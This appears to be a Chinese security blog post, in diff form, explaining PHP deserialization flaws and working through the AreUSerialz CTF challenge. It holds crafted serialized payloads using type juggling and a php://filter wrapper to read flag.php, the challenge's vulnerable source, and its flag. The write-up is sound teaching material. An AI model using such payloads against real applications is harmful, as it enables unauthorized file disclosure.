@@ -1,0 +1,875 @@
+<!DOCTYPE html>
+<html lang="en-us">
+  <head>
+    
+    <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="generator" content="Hugo 0.80.0 with theme Tranquilpeak 0.4.8-BETA">
+<meta name="author" content="Zor01478">
+<meta name="keywords" content="反序列化, C/C&#43;&#43;, PHP, Java, 渗透">
+<meta name="description" content="
+Web漏洞-反序列化之PHP
+">
+
+
+<meta property="og:description" content="
+Web漏洞-反序列化之PHP
+">
+<meta property="og:type" content="article">
+<meta property="og:title" content="PHP与Java反序列化浅析（上篇）">
+<meta name="twitter:title" content="PHP与Java反序列化浅析（上篇）">
+<meta property="og:url" content="https://Zor01478.github.io/2021/01/php%E4%B8%8Ejava%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%85%E6%9E%90%E4%B8%8A%E7%AF%87/">
+<meta property="twitter:url" content="https://Zor01478.github.io/2021/01/php%E4%B8%8Ejava%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%85%E6%9E%90%E4%B8%8A%E7%AF%87/">
+<meta property="og:site_name" content="戴头盔的招财">
+<meta property="og:description" content="
+Web漏洞-反序列化之PHP
+">
+<meta name="twitter:description" content="
+Web漏洞-反序列化之PHP
+">
+<meta property="og:locale" content="zh-cn">
+
+  
+    <meta property="article:published_time" content="2021-01-31T16:26:02">
+  
+  
+    <meta property="article:modified_time" content="2021-01-31T16:26:02">
+  
+  
+  
+    
+      <meta property="article:section" content="招财渗透屋">
+    
+  
+  
+    
+      <meta property="article:tag" content="反序列化">
+    
+      <meta property="article:tag" content="PHP">
+    
+  
+
+
+<meta name="twitter:card" content="summary">
+
+
+
+
+
+
+
+  <meta property="og:image" content="https://Zor01478.github.io/images/suolue2.png">
+  <meta property="twitter:image" content="https://Zor01478.github.io/images/suolue2.png">
+
+
+  <meta property="og:image" content="https://Zor01478.github.io/images/fengmian2.jpg">
+  <meta property="twitter:image" content="https://Zor01478.github.io/images/fengmian2.jpg">
+
+
+
+
+  <meta property="og:image" content="https://Zor01478.github.io/images/caomao.png">
+  <meta property="twitter:image" content="https://Zor01478.github.io/images/caomao.png">
+
+
+    <title>PHP与Java反序列化浅析（上篇）</title>
+
+    <link rel="icon" href="https://Zor01478.github.io/shanzhi.jpg">
+    
+
+    
+
+    <link rel="canonical" href="https://Zor01478.github.io/2021/01/php%E4%B8%8Ejava%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%85%E6%9E%90%E4%B8%8A%E7%AF%87/">
+
+    
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" integrity="sha256-eZrrJcwDc/3uDhsdt61sL2oOBY362qM3lon1gyExkL0=" crossorigin="anonymous" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/2.1.4/jquery.fancybox.min.css" integrity="sha256-vuXZ9LGmmwtjqFX1F+EKin1ThZMub58gKULUyf0qECk=" crossorigin="anonymous" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/2.1.4/helpers/jquery.fancybox-thumbs.min.css" integrity="sha256-SEa4XYAHihTcEP1f5gARTB2K26Uk8PsndQYHQC1f4jU=" crossorigin="anonymous" />
+    
+    
+    <link rel="stylesheet" href="https://Zor01478.github.io/css/style-twzjdbqhmnnacqs0pwwdzcdbt8yhv8giawvjqjmyfoqnvazl0dalmnhdkvp7.min.css" />
+    
+    
+
+    
+      
+    
+    
+  </head>
+
+
+  <body>
+    <div id="blog">
+      <header id="header" data-behavior="5">
+  <i id="btn-open-sidebar" class="fa fa-lg fa-bars"></i>
+  <div class="header-title">
+    <a class="header-title-link" href="https://Zor01478.github.io/">戴头盔的招财</a>
+  </div>
+  
+    
+      <a class="header-right-picture "
+         href="https://Zor01478.github.io/#about">
+    
+    
+    
+      
+        <img class="header-picture" src="https://Zor01478.github.io/images/caomao.png" alt="作者的图片" />
+      
+    
+    </a>
+  
+</header>
+
+      <nav id="sidebar" data-behavior="5">
+  <div class="sidebar-container">
+    
+      <div class="sidebar-profile">
+        <a href="https://Zor01478.github.io/#about">
+          <img class="sidebar-profile-picture" src="https://Zor01478.github.io/images/caomao.png" alt="作者的图片" />
+        </a>
+        <h4 class="sidebar-profile-name">Zor01478</h4>
+        
+          <h5 class="sidebar-profile-bio">戴了头盔，所以头很铁</h5>
+        
+      </div>
+    
+    <ul class="sidebar-buttons">
+      
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://Zor01478.github.io/">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-home"></i>
+      
+      <span class="sidebar-button-desc">首页</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://Zor01478.github.io/categories">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-bookmark"></i>
+      
+      <span class="sidebar-button-desc">类别</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://Zor01478.github.io/tags">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-tags"></i>
+      
+      <span class="sidebar-button-desc">标签</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://Zor01478.github.io/archives">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-archive"></i>
+      
+      <span class="sidebar-button-desc">归档</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://Zor01478.github.io/#about">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-question"></i>
+      
+      <span class="sidebar-button-desc">关于</span>
+    </a>
+  </li>
+
+
+    </ul>
+    <ul class="sidebar-buttons">
+      
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://github.com/Zor01478" target="_blank" rel="noopener">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-github"></i>
+      
+      <span class="sidebar-button-desc">GitHub</span>
+    </a>
+  </li>
+
+
+    </ul>
+    <ul class="sidebar-buttons">
+      
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://Zor01478.github.io/index.xml">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-rss"></i>
+      
+      <span class="sidebar-button-desc">RSS</span>
+    </a>
+  </li>
+
+
+    </ul>
+  </div>
+</nav>
+
+      
+  <div class="post-header-cover
+              text-center
+              post-header-cover--full"
+       style="background-image:url('/images/fengmian2.jpg')"
+       data-behavior="5">
+    
+      <div class="post-header main-content-wrap text-center">
+  
+    <h1 class="post-title" itemprop="headline">
+      PHP与Java反序列化浅析（上篇）
+    </h1>
+  
+  
+  <div class="postShorten-meta post-meta">
+    
+      <time itemprop="datePublished" datetime="2021-01-31T16:26:02&#43;08:00">
+        
+  一月 31, 2021
+
+      </time>
+    
+    
+  
+  
+    <span>发布在</span>
+    
+      <a class="category-link" href="https://Zor01478.github.io/categories/%e6%8b%9b%e8%b4%a2%e6%b8%97%e9%80%8f%e5%b1%8b">招财渗透屋</a>
+    
+  
+
+  </div>
+
+</div>
+    
+  </div>
+
+
+      <div id="main" data-behavior="5"
+        class="hasCover
+               hasCoverMetaIn
+               hasCoverCaption">
+        <article class="post" itemscope itemType="http://schema.org/BlogPosting">
+          
+            <span class="post-header-cover-caption caption">雪国的樱花</span>
+          
+          
+          <div class="post-content markdown" itemprop="articleBody">
+            <div class="main-content-wrap">
+              <blockquote>
+<p>Web漏洞-反序列化之PHP</p>
+</blockquote>
+<h1 id="目录">目录</h1>
+<!-- raw HTML omitted -->
+<ul>
+<li><a href="#web%E6%BC%8F%E6%B4%9E-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96php">Web漏洞-反序列化（PHP）</a>
+<ul>
+<li><a href="#%E5%8E%9F%E7%90%86">原理</a></li>
+<li><a href="#%E6%8A%80%E6%9C%AF">技术</a></li>
+<li><a href="#%E5%88%A9%E7%94%A8">利用</a></li>
+<li><a href="#%E5%8D%B1%E5%AE%B3">危害</a></li>
+<li><a href="#php">PHP</a>
+<ul>
+<li><a href="#%E8%AE%BF%E9%97%AE%E4%BF%AE%E9%A5%B0%E7%AC%A6%E5%BA%8F%E5%88%97%E5%8C%96%E5%90%8E%E7%9A%84%E5%8C%BA%E5%88%AB">访问修饰符序列化后的区别</a></li>
+</ul>
+</li>
+<li><a href="#%E5%AE%9E%E8%B7%B5">实践</a>
+<ul>
+<li><a href="#-%E7%BD%91%E9%BC%8E%E6%9D%AF-%E9%9D%92%E9%BE%99%E7%BB%84-web-areuserialz">-网鼎杯-青龙组-Web-AreUSerialz</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<!-- raw HTML omitted -->
+<h2 id="web漏洞-反序列化php">Web漏洞-反序列化（PHP）</h2>
+<h3 id="原理">原理</h3>
+<ul>
+<li>序列化：将<strong>对象的状态信息</strong>转换为<strong>可以存储或传输的形式</strong>的过程。在序列化期间，对象将其当前状态写入到临时或持久性存储区。以后，可以通过从存储区中读取或<strong>反序列化</strong>对象的状态，重新创建该对象。</li>
+<li>反序列化：顾名思义。</li>
+</ul>
+<h3 id="技术">技术</h3>
+<ul>
+<li>有类（触发相关魔术方法）
+<ul>
+<li>__construct  【对象创建时触发】</li>
+<li>__destruct    【对象被销毁时触发】</li>
+<li>__toString    【当对象被当做一个字符串使用时调用】</li>
+<li>__sleep         【序列化对象之前就调用此方法(其返回需要一个数组)】</li>
+<li>__wakeup     【反序列化恢复对象之前调用该方法】</li>
+<li>__call            【当调用对象中不存在（私有）的方法会自动调用该方法】</li>
+<li>__get            【在调用私有属性的时候会自动执行】</li>
+<li>__set            【将数据写入不可访问的属性】</li>
+<li>__isset         【在私有属性上调用isset()或empty()触发】</li>
+<li>__unset        【在不可访问的属性上使用unset()时触发】</li>
+<li>__invoke      【当脚本尝试将对象调用为函数时触发】</li>
+</ul>
+</li>
+<li>无类</li>
+</ul>
+<h3 id="利用">利用</h3>
+<ul>
+<li>真实应用 / CTF</li>
+<li>unserialize() 的变量可控</li>
+<li>文件中存在可利用的类</li>
+<li>类中有魔术方法</li>
+</ul>
+<h3 id="危害">危害</h3>
+<ul>
+<li>SQL注入</li>
+<li>代码执行</li>
+<li>目录遍历</li>
+<li>&hellip;
+<img src="https://Zor01478.github.io/images/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E9%97%B4%E7%9A%84%E5%85%B3%E7%B3%BB.png" alt="语言序列化之间的关系"></li>
+</ul>
+<h3 id="php">PHP</h3>
+<ul>
+<li><code>serialize()</code> // 将对象序列化成一个字符串</li>
+<li><code>unserialize()</code> // 将字符串反序列化成为一个对象</li>
+</ul>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#75715e"># 无类
+</span><span style="color:#75715e"># 1.序列化
+</span><span style="color:#75715e"></span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+    $key<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;test&#39;</span>;
+    <span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">serialize</span>($key);
+<span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span><span style="color:#960050;background-color:#1e0010">//输出如下：
+</span><span style="color:#960050;background-color:#1e0010">	s:4:&#34;test&#34;;
+</span><span style="color:#960050;background-color:#1e0010">	
+</span><span style="color:#960050;background-color:#1e0010"># 2.反序列化
+</span><span style="color:#960050;background-color:#1e0010">&lt;?php
+</span><span style="color:#960050;background-color:#1e0010">    $key=&#39;s:4:&#34;test&#34;;&#39;;
+</span><span style="color:#960050;background-color:#1e0010">    echo unserialize($key);
+</span><span style="color:#960050;background-color:#1e0010">?&gt;
+</span><span style="color:#960050;background-color:#1e0010">// 输出如下：
+</span><span style="color:#960050;background-color:#1e0010">	test
+</span></code></pre></div><ul>
+<li>序列化后大致的含义：<strong>O : 4 : &ldquo;info&rdquo; : 2 : {s : 4 : &ldquo;name&rdquo; ; s : 2 : &ldquo;19&rdquo; ;}</strong>
+<ul>
+<li>O 代表Object</li>
+<li>4 代表对象长度</li>
+<li>info 代表对象名称</li>
+<li>2 代表对象中变量（属性）的个数</li>
+<li>s 代表属性名数据类型string，类似的还有其他类型例如i  &ndash;&gt; int</li>
+<li>4 属性名长度</li>
+<li>name 属性名</li>
+<li>s 属性值的类型</li>
+<li>2 属性值的长度</li>
+<li>19 属性值</li>
+</ul>
+</li>
+</ul>
+<h4 id="访问修饰符序列化后的区别">访问修饰符序列化后的区别</h4>
+<p><code>public</code>：属性被序列化的时候<strong>属性名</strong>不变；
+<code>protected</code>：属性被序列化的时候属性名会变成<code>%00*%00</code>属性名，长度跟随属性名长度而改变
+<code>private</code>：属性被序列化的时候属性名会变成<code>%00类名%00</code>属性名，长度跟随属性名长度而改变</p>
+<p>注：这里的%00也就是表示空字符（即空格），在url中用%00表示，在hex中表示\x00【%00和\x00也就是我们常说的00截断】</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#75715e"># 像这种整型长度就位零
+</span><span style="color:#75715e"></span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+    $key<span style="color:#f92672">=</span><span style="color:#ae81ff">123456</span>;   <span style="color:#75715e">// $key=&#34;123456&#34; 就代表字符串
+</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">serialize</span>($key);
+<span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span><span style="color:#960050;background-color:#1e0010">
+</span><span style="color:#960050;background-color:#1e0010"># 输出如下：
+</span><span style="color:#960050;background-color:#1e0010">	i:123456;
+</span></code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#75715e"># 有类
+</span><span style="color:#75715e"></span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+<span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Test</span>{
+    <span style="color:#66d9ef">public</span> $test <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;yyds&#34;</span>;
+    <span style="color:#66d9ef">protected</span> $name <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;cxk&#34;</span>;
+    <span style="color:#66d9ef">private</span> $skills <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;c/t/r&#34;</span>;
+    
+    <span style="color:#66d9ef">function</span>  __construct() {
+        <span style="color:#66d9ef">echo</span><span style="color:#e6db74">&#34;调用了构造函数</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
+    }
+    
+    <span style="color:#66d9ef">function</span> __destruct() {
+        <span style="color:#66d9ef">echo</span>(<span style="color:#e6db74">&#34;程序结束，自动调用了析构函数，销毁对象</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+    }
+    
+    <span style="color:#66d9ef">function</span> __sleep() {
+        <span style="color:#66d9ef">echo</span>(<span style="color:#e6db74">&#34;序列化时会先调用sleep函数（若存在）并且只会序列化sleep中的属性</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">array</span>(<span style="color:#e6db74">&#39;name&#39;</span>);
+    }
+    
+    <span style="color:#66d9ef">function</span> __wakeup() {
+        <span style="color:#66d9ef">echo</span>(<span style="color:#e6db74">&#34;执行反序列化操作时会调用wakeup函数（若存在）</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+    }
+}    
+<span style="color:#66d9ef">echo</span>(<span style="color:#e6db74">&#34;创建对象</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+$a <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Test</span>;
+
+<span style="color:#66d9ef">echo</span>(<span style="color:#e6db74">&#34;序列化</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+$ser_a <span style="color:#f92672">=</span> <span style="color:#a6e22e">serialize</span>($a);
+<span style="color:#66d9ef">echo</span>($ser_a);
+<span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">PHP_EOL</span>; <span style="color:#75715e">//换行
+</span><span style="color:#75715e"></span>
+<span style="color:#66d9ef">echo</span>(<span style="color:#e6db74">&#34;反序列化</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+$unser_a <span style="color:#f92672">=</span> <span style="color:#a6e22e">unserialize</span>($ser_a);
+<span style="color:#a6e22e">var_dump</span>($unser_a);
+<span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></code></pre></div><p><strong>输出如下：</strong></p>
+<p>创建对象
+调用了构造函数
+序列化
+<strong><code>序列化时会先调用sleep函数（若存在）并且只会序列化sleep中的属性</code></strong>
+O:4:&ldquo;Test&rdquo;:1:{s:7:&quot;*name&quot;;s:3:&ldquo;cxk&rdquo;;}
+反序列化
+执行反序列化操作会调用wakeup函数（若存在）
+object(Test)#2 (3) {
+[&ldquo;test&rdquo;]=&gt;
+string(4) &ldquo;yyds&rdquo;
+[&ldquo;name&rdquo;:protected]=&gt;
+string(3) &ldquo;cxk&rdquo;
+[&ldquo;skills&rdquo;:&ldquo;Test&rdquo;:private]=&gt;
+string(5) &ldquo;c/t/r&rdquo;
+}
+<strong><code>程序结束，自动调用了析构函数，销毁对象</code></strong>
+程序结束，自动调用了析构函数，销毁对象
+<strong>【注】</strong></p>
+<ul>
+<li><strong>反序列化会自动多调用一次析构函数</strong></li>
+<li>绕过wakeup：修改<strong>属性类型</strong>或<strong>属性名长度</strong>均可绕过执行__wakeup，因为你构造的属性和真实的属性不符；<code>但修改属性值是不会绕过__wakeup</code>，所以综述：只有改变**<code>属性个数、属性类型、属性名</code>**才可以绕过！</li>
+</ul>
+<h3 id="实践">实践</h3>
+<h4 id="-网鼎杯-青龙组-web-areuserialz">-网鼎杯-青龙组-Web-AreUSerialz</h4>
+<ol>
+<li>涉及知识点：unserialize、<code>==</code> 和 <code>===</code>的区别、还有上文中访问修饰符号序列化后的区别</li>
+<li><code>==</code>只是对值得比较（将两边值转化为同类型再比较），而<code>===</code>则是对值和类型的比较。</li>
+<li>对于==的比较，若有一方为数字，另一方为字符串或空或null，<strong>会先将非数字一方转化为0</strong>，再做比较。</li>
+</ol>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+$a<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;2&#34;</span>;
+$b<span style="color:#f92672">=</span><span style="color:#e6db74">&#34; 2&#34;</span>;
+$c<span style="color:#f92672">=</span><span style="color:#ae81ff">2</span>;
+$d<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>;
+$e<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;test&#34;</span>;
+
+<span style="color:#75715e">// a 和 b
+</span><span style="color:#75715e"></span><span style="color:#66d9ef">if</span> ($a <span style="color:#f92672">==</span> $b) {
+    <span style="color:#66d9ef">echo</span>(<span style="color:#e6db74">&#34;a == b</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+}<span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> ($a <span style="color:#f92672">===</span> $b) {
+    <span style="color:#66d9ef">echo</span>(<span style="color:#e6db74">&#34;a === b</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+}
+
+<span style="color:#75715e">// a 和 c
+</span><span style="color:#75715e"></span><span style="color:#66d9ef">if</span> ($a <span style="color:#f92672">==</span> $c) {
+    <span style="color:#66d9ef">echo</span>(<span style="color:#e6db74">&#34;a == c</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+}<span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> ($a <span style="color:#f92672">===</span> $c) {
+    <span style="color:#66d9ef">echo</span>(<span style="color:#e6db74">&#34;a === c</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+}
+
+<span style="color:#75715e">// b 和 c
+</span><span style="color:#75715e"></span><span style="color:#66d9ef">if</span> ($b <span style="color:#f92672">==</span> $c) {
+    <span style="color:#66d9ef">echo</span>(<span style="color:#e6db74">&#34;b == c</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+}<span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> ($b <span style="color:#f92672">===</span> $c) {
+    <span style="color:#66d9ef">echo</span>(<span style="color:#e6db74">&#34;b === c</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+}
+
+<span style="color:#75715e">// d 和 e
+</span><span style="color:#75715e"></span><span style="color:#66d9ef">if</span> ($d <span style="color:#f92672">==</span> $e) {
+    <span style="color:#66d9ef">echo</span>(<span style="color:#e6db74">&#34;d == e</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+}<span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> ($d <span style="color:#f92672">===</span> $e) {
+    <span style="color:#66d9ef">echo</span>(<span style="color:#e6db74">&#34;d === e</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+}
+<span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span><span style="color:#960050;background-color:#1e0010">
+</span><span style="color:#960050;background-color:#1e0010">// 输出如下：
+</span><span style="color:#960050;background-color:#1e0010">	a == b
+</span><span style="color:#960050;background-color:#1e0010">	a == c
+</span><span style="color:#960050;background-color:#1e0010">	b == c
+</span><span style="color:#960050;background-color:#1e0010">	d == e
+</span></code></pre></div><ol start="4">
+<li>回到题目：由于反序列化会自动执行一次析构函数，并且由题目源码可知flag在flag.php中，考虑魔术函数__destruct() 和 __construct()，还有一个类FileHandler，含有三个属性，分别为op，filename，content。</li>
+<li>梳理一下函数执行及判断调用流程：如果创建一个类对象那么就会调用__construct构造函数 → proces函数 → 判断op的值 →为1则执行write函数，为2则执行read函数【<strong>明显这才是我们需要掉的函数</strong>】；</li>
+<li>析构函数会将op的值设置为1 → 调用process函数；【<strong>解题关键</strong>】</li>
+<li>输入一个字符串，如果有效那么久执行反序列化操作。</li>
+</ol>
+<p><strong>GET方式传入序列化的str字符串，str字符串中每一个字符的ASCII范围在32到125之间</strong></p>
+<ul>
+<li>三种姿势</li>
+<li>不完整的反序列化</li>
+<li>获取绝对路径</li>
+<li>直接用相对路径</li>
+</ul>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+<span style="color:#66d9ef">class</span> <span style="color:#a6e22e">FileHandler</span>{
+    <span style="color:#66d9ef">public</span> $op <span style="color:#f92672">=</span> <span style="color:#ae81ff">2</span>;  <span style="color:#75715e">// 或者 $op = &#34; 2&#34;
+</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">public</span> $filename <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;flag.php&#34;</span>;  <span style="color:#75715e">//php://filter/read=convert.base64-encode/resource=flag.php   的到的结果需要base64解密
+</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">public</span> $content;  <span style="color:#75715e">//$content = &#34;yyds&#34;
+</span><span style="color:#75715e"></span>
+}
+$a <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">FileHandler</span>();
+<span style="color:#66d9ef">echo</span>  <span style="color:#a6e22e">serialize</span>($a);
+</code></pre></div><ol>
+<li>O:11:&ldquo;FileHandler&rdquo;:3:{s:2:&ldquo;op&rdquo;;i:2;s:8:&ldquo;filename&rdquo;;s:8:&ldquo;flag.php&rdquo;;s:7:&ldquo;content&rdquo;;N;}  这个playload需要把最后的 <code>}</code> 去掉</li>
+<li>O:11:&ldquo;FileHandler&rdquo;:3:{s:2:&ldquo;op&rdquo;;i:2;s:8:&ldquo;filename&rdquo;;s:8:&ldquo;flag.php&rdquo;;s:7:&ldquo;content&rdquo;;s:4:&ldquo;yyds&rdquo;;} 完整的反序列化</li>
+<li>O:11:&ldquo;FileHandler&rdquo;:3:{s:2:&ldquo;op&rdquo;;i:2;s:8:&ldquo;filename&rdquo;;s:57:&ldquo;php://filter/read=convert.base64-encode/resource=flag.php&rdquo;;s:7:&ldquo;content&rdquo;;s:4:&ldquo;yyds&rdquo;;}</li>
+</ol>
+<p>答案：</p>
+<ul>
+<li>PD9waHAKJEZMQUcgPSAiY3RmaHViezg5MGZiZTczNDYyMzcwOWJhMjMxYzNhZX0iOwo/Pgo=     需要base64解密</li>
+<li>F12查看：   ctfhub{890fbe734623709ba231c3ae}</li>
+</ul>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#75715e"># 题目源码
+</span><span style="color:#75715e"></span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+ 
+<span style="color:#66d9ef">include</span>(<span style="color:#e6db74">&#34;flag.php&#34;</span>);
+ 
+<span style="color:#a6e22e">highlight_file</span>(<span style="color:#66d9ef">__FILE__</span>);
+ 
+<span style="color:#66d9ef">class</span> <span style="color:#a6e22e">FileHandler</span> {
+ 
+    <span style="color:#66d9ef">protected</span> $op;
+    <span style="color:#66d9ef">protected</span> $filename;
+    <span style="color:#66d9ef">protected</span> $content;
+ 
+    <span style="color:#66d9ef">function</span> __construct() {
+        $op <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;1&#34;</span>;
+        $filename <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/tmp/tmpfile&#34;</span>;
+        $content <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Hello World!&#34;</span>;
+        $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">process</span>();
+    }
+ 
+    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">process</span>() {
+        <span style="color:#66d9ef">if</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">op</span> <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;1&#34;</span>) {
+            $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">write</span>();
+        } <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">op</span> <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;2&#34;</span>) {
+            $res <span style="color:#f92672">=</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">read</span>();
+            $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">output</span>($res);
+        } <span style="color:#66d9ef">else</span> {
+            $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">output</span>(<span style="color:#e6db74">&#34;Bad Hacker!&#34;</span>);
+        }
+    }
+ 
+    <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">write</span>() {
+        <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">isset</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">filename</span>) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">isset</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">content</span>)) {
+            <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">strlen</span>((<span style="color:#a6e22e">string</span>)$this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">content</span>) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">100</span>) {
+                $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">output</span>(<span style="color:#e6db74">&#34;Too long!&#34;</span>);
+                <span style="color:#66d9ef">die</span>();
+            }
+            $res <span style="color:#f92672">=</span> <span style="color:#a6e22e">file_put_contents</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">filename</span>, $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">content</span>);
+            <span style="color:#66d9ef">if</span>($res) $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">output</span>(<span style="color:#e6db74">&#34;Successful!&#34;</span>);
+            <span style="color:#66d9ef">else</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">output</span>(<span style="color:#e6db74">&#34;Failed!&#34;</span>);
+        } <span style="color:#66d9ef">else</span> {
+            $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">output</span>(<span style="color:#e6db74">&#34;Failed!&#34;</span>);
+        }
+    }
+ 
+    <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">read</span>() {
+        $res <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>;
+        <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">isset</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">filename</span>)) {
+            $res <span style="color:#f92672">=</span> <span style="color:#a6e22e">file_get_contents</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">filename</span>);
+        }
+        <span style="color:#66d9ef">return</span> $res;
+    }
+ 
